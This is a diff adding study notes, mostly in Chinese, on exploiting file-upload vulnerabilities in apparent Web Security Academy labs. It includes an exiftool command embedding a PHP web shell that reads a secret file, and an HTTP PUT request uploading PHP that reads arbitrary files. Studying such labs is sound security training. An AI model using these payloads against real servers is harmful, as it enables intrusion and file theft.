@@ -62,3 +62,30 @@
 - exploit.php
 
 ## Flawed validation
+- 位元組序列
+- JPEG 檔案始終以位元組 開頭FF D8 FF
+- 使用 ExifTool 等特殊工具
+
+**Lab: Remote code execution via polyglot web shell upload**
+- exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+## Other 
+**Exploiting file upload race conditions**
+- 先將檔案上傳到一個臨時的沙盒目錄，並隨機化檔案名稱以避免覆蓋現有檔案
+
+**Exploiting file upload vulnerabilities without remote code execution**
+- 上傳 HTML 檔案或 SVG 圖像
+- <script>
+
+**Exploiting vulnerabilities in the parsing of uploaded files**
+- 嘗試利用特定於解析或處理不同檔案格式的漏洞
+- .doc.xls.xml
+-  XXE 注入攻擊的潛在載體
+  
+**使用 PUT 上傳文件**
+- OPTIONS 向不同的端點發送請求，以測試是否有任何端點支援該PUT方法
+- PUT /images/exploit.php HTTP/1.1
+- Host: vulnerable-website.com
+- Content-Type: application/x-httpd-php
+- Content-Length: 49
+- <"?php echo file_get_contents('/path/to/file'); ?">
